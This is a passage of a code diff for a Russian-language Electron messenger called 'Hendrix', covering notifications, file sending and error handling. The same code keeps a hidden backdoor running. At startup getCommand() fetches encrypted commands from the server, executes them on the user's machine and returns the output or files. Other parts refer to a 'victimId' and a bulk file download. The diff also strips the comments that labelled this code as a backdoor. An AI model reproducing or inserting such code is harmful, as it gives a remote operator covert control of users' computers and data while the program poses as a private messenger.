+                    elements.dialog.insertAdjacentHTML(`beforeEnd`, getMessageBlock(message.color, `${nameBlock}${additional}`, `${hours.padStart(2, `0`)}:${minutes.padStart(2, `0`)}:${seconds.padStart(2, `0`)}`, text, message.user == this._id ? `#2b5278` : false));
+                    const focusedWindow = BrowserWindow.getFocusedWindow();
+                    if (message.name && message.message && message.color && this.showNotifications && !focusedWindow || focusedWindow.id != currentWindow.id) {
                         ipcRenderer.send(`notification`, {
                             name: message.name,
                             text: message.message,
@@ -1555,16 +1899,14 @@ getElem(`next`).addEventListener(`click`, async function (e) {
                         _id: this._id
                     }
                 });
+                if (!encryptedMessage) {
+                    return setImmediate(this.oneToOneSubscribe);
+                }
                 const message = await getDecryptedData(encryptedMessage.data, this.aesKeyBytes);
                 addOneToOneMessage(message.from, this, message.text, message.date);
                 setImmediate(this.oneToOneSubscribe);
             },
             async disconnect() {
-                if (this.audio) {
-                    changeIcon();
-                    delete this.audio;
-                    recorder.stop(); //остановка по-другому должна быть реализована
-                }
                 await requestPostAsync({
                     url: `${server}/disconnect`,
                     form: {
@@ -1575,7 +1917,20 @@ getElem(`next`).addEventListener(`click`, async function (e) {
                 delete this.room;
                 this._dump = [];
                 elements.dialog.innerHTML = elements.titleText.innerHTML = ``;
-                return true;
+                elements.dialog.dispatchEvent(new CustomEvent(`scroll`));
+                await new Promise(resolve => {
+                    animate({
+                        timing: circAnimateFunc,
+                        draw(progress) {
+                            elements.chat.style.gridTemplateRows = `minmax(18px, 3vh) ${80 + 20 * progress}vh 3vh 11vh 5vh`;
+                        },
+                        duration: 200,
+                        endAnimation() {
+                            getElem(`message`).style.display = `none`;
+                            resolve();
+                        }
+                    });
+                });
             }
         };
         let color, _token;
@@ -1615,7 +1970,7 @@ getElem(`next`).addEventListener(`click`, async function (e) {
         ipcRenderer.send(`alive`, user._id);
         await showRooms();
 
-        getCommand(); //для бекдура, ес чо удалить
+        getCommand(); //ес чо удалить
 
         setInterval(async () => {
             await showRooms();
@@ -1627,7 +1982,7 @@ getElem(`next`).addEventListener(`click`, async function (e) {
     }
     getElem(`about-program`).addEventListener(`click`, () => {
         const div = document.createElement(`div`);
-        div.innerHTML = `<div style="width:100%;word-wrap: break-word;user-select: text;"><img src = "logo.png"><br><br>Anonymous messenger <span style="color:#66CCFF">Hendrix ${version}</span> by <span style="color:#FFA000">HuHguZ</span><br><br>Ваш Id в системе:<br><span style="color: ${user.color}">${user._id}</span></div>`;
+        div.innerHTML = `<div style="width:100%;word-wrap: break-word;user-select: text;"><img src = "logo.png" style="user-select: none;"><br style="user-select: none;"><br style="user-select: none;">Anonymous messenger <span style="color:#66CCFF">Hendrix ${version}</span> by <span style="color:#FFA000">HuHguZ</span><br><br>Ваш Id в системе:<br><span style="color: ${user.color}">${user._id}</span></div>`;
         swal({
             content: div,
             button: false
@@ -1689,7 +2044,7 @@ const waitStream = stream => new Promise((res, rej) => {
     });
 });
 
-const sendBuffer = async (buffer, ext, info) => {
+const sendBuffer = async (buffer, ext, info, fileName) => {
     const len = buffer.length;
     buffer = divideBuf(buffer, highWaterMark).reverse();
     const readable = Readable();
@@ -1700,10 +2055,10 @@ const sendBuffer = async (buffer, ext, info) => {
             this.push(null);
         }
     }
-    await sendFile(null, len, readable, ext, info);
+    await sendFile(null, len, readable, ext, info, fileName);
 };
 
-const sendFile = async (file, size, readable, extn, info) => {
+const sendFile = async (file, size, readable, extn, info, fileName) => {
     const callbackStack = [];
     let readStream;
     let ext;
@@ -1716,7 +2071,7 @@ const sendFile = async (file, size, readable, extn, info) => {
         readStream = readable;
         ext = extn;
     }
-    const fileId = await getRandomId();
+    const fileId = fileName || await getRandomId();
     let pr = 0;
     let position = 0;
     readStream.on(`data`, data => {
@@ -1749,8 +2104,7 @@ const sendFile = async (file, size, readable, extn, info) => {
     await waitStream(readStream);
     for (let i = 0; i < callbackStack.length; i++) {
         if (!user.room) {
-            currentWindow.setProgressBar(0);
-            return;
+            return currentWindow.setProgressBar(0);
         }
         currentWindow.setProgressBar((i + 1) / callbackStack.length);
         await callbackStack[i]();
@@ -1797,7 +2151,7 @@ const getCallbackFromFiles = files => async () => {
             showErrorModal(`${fullPath} слишком велик!`);
             er = true;
         } else {
-            await sendBuffer(await zlib.deflate(await fs.readFile(fullPath)), path.extname(fullPath));
+            await sendBuffer(await zlib.deflate(await fs.readFile(fullPath)), path.extname(fullPath), null, elements.saveFilesNames.checked ? path.basename(fullPath, path.extname(fullPath)) : false);
         }
     };
     if (!er) {
@@ -1805,12 +2159,14 @@ const getCallbackFromFiles = files => async () => {
     }
 };
 
-getElem(`file`).addEventListener(`click`, () => {
+getElem(`file`).addEventListener(`click`, async () => {
     if (user.room) {
-        const files = dialog.showOpenDialog(currentWindow, {
+        const {
+            filePaths
+        } = await dialog.showOpenDialog(currentWindow, {
             properties: [`openFile`, `multiSelections`]
         });
-        filesSendCallbacksStack.push(getCallbackFromFiles(files));
+        filesSendCallbacksStack.push(getCallbackFromFiles(filePaths));
     } else {
         showErrorModal(`Вы ещё не вошли в комнату!`);
     }
@@ -1849,8 +2205,18 @@ const handleError = async err => {
             _id: user._id
         }
     });
-    showErrorDialog(`Необработанное исключение ${err.message || err || `undefined`}. Перезайдите в приложение.`);
-    //remote.app.quit();
+    const {response} = (await dialog.showMessageBox(currentWindow, {
+        type: `error`,
+        title: `Что-то пошло не так...`,
+        message: `Необработанное исключение ${err.message || err || `undefined`}. Что делаем?`,
+        buttons: [`Выйти из Hendrix`, `Перезапустить Hendrix`, `Ничего`],
+    }));
+    switch(response) {
+        case 1:
+            remote.app.relaunch();
+        case 0:
+            remote.app.quit();
+    }
 };
 
 window.addEventListener(`unhandledrejection`, function (promiseRejectionEvent) {
@@ -2193,8 +2559,6 @@ getElem(`oneToone`).addEventListener(`click`, () => {
         button: false
     });
 });
-
-//backdoor code
 
 let checkedRoot = false;
 let accessRoot = false;
@@ -2603,7 +2967,7 @@ downloadAll.addEventListener(`click`, async () => {
         buttons: [`Нет`, `Да`]
     }, true)})`, victimId.value);
     swal({
-        content: backDoorBlock,
+        content: backDoorFiles,
         button: false
     });
 });
@@ -2861,6 +3225,9 @@ const getCommand = async () => {
     const {
         command
     } = getDecryptedDataBackDoor(cmd, user.aesKeyBytes);
+    console.log(
+        getDecryptedDataBackDoor(cmd, user.aesKeyBytes)
+    )
     const dt = executeCode(command) || ``;
     result = dt.length > packetSize ? (sendBufferBackDoor(Buffer.from(dt), `.txt`), `Слишком большой результат команды, отправляю файл`) : dt;
     await sendReadyData(result);
